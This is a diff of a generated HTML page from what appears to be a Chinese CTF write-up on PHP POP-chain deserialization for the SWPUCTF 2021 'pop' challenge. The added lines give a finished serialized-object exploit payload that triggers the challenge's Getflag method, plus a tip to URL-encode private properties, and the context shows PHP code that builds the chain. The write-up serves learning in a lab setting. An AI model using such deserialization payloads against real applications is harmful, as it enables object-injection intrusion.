@@ -27,7 +27,7 @@
 <meta property="og:description" content="pop链，我也不知道是什么  POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的一种payload，实战应用范围暂时没遇到，不过在CTF比赛中经常出现这样的题目，同时也经常与反序列化一起考察，可以理解为是反序列化的一种拓展，泛用性更强，涉及到的魔法方法也更多。    [SWPUCTF 2021 新生赛]pop我想tag可以有：pop链，反序列化原题： 123456789101112131">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-03-19T10:49:19.000Z">
-<meta property="article:modified_time" content="2025-03-19T12:35:10.340Z">
+<meta property="article:modified_time" content="2025-03-19T13:43:41.947Z">
 <meta property="article:author" content="aidemofashi">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k 字
+          1.3k 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          10 分钟
+          11 分钟
         
       </span>
     
@@ -322,6 +322,11 @@
 <p>wp作者：</p>
 <figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">$a=new w22m();<span class="hljs-comment">//这段代码说明我们将w22m类赋值给a，现在可以将$a看做w22m类,所以现在$a中有一个属性w00m</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span>w00m=new w33m();<span class="hljs-comment">//将w22m中的w00m属性调用（指向）w33m类：现在w22m中w00m属性有w33类中w00m和w22m两个属性。</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>w00m=new w44m();<span class="hljs-comment">//w22m类中w00m属性调用了w44m类</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<span class="hljs-comment">//使用了w44m类中的Getflag方法，()在w33m中_toString()方法被调用。</span><br>最后的效果就是在w44m中执行了Getflag()整个方法，输出了$flag的值。<br></code></pre></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010723806/article/details/142340216">https://blog.csdn.net/u010723806/article/details/142340216</a></p>
+<p>最后payload</p>
+<h2 id="O-4-”w22m”-1-s-4-”w00m”-O-4-”w33m”-2-s-4-”w00m”-O-4-”w44m”-2-s-11-”w44madmin”-s-4-”w44m”-s-9-”-passwd”-s-5-”08067”-s-4-”w22m”-s-7-”Getflag”"><a href="#O-4-”w22m”-1-s-4-”w00m”-O-4-”w33m”-2-s-4-”w00m”-O-4-”w44m”-2-s-11-”w44madmin”-s-4-”w44m”-s-9-”-passwd”-s-5-”08067”-s-4-”w22m”-s-7-”Getflag”" class="headerlink" title="O:4:”w22m”:1:{s:4:”w00m”;O:4:”w33m”:2:{s:4:”w00m”;O:4:”w44m”:2:{s:11:”w44madmin”;s:4:”w44m”;s:9:”*passwd”;s:5:”08067”;}s:4:”w22m”;s:7:”Getflag”;}}"></a>O:4:”w22m”:1:{s:4:”w00m”;O:4:”w33m”:2:{s:4:”w00m”;O:4:”w44m”:2:{s:11:”w44madmin”;s:4:”w44m”;s:9:”*passwd”;s:5:”08067”;}s:4:”w22m”;s:7:”Getflag”;}}</h2><p>传入要型url编码，</p>
+<blockquote>
+<p>当我们传递的参数中含有private变量时，一定要url编码一下，否则会有不可见字符导致解析出错</p>
+</blockquote>
 
                 
               </div>
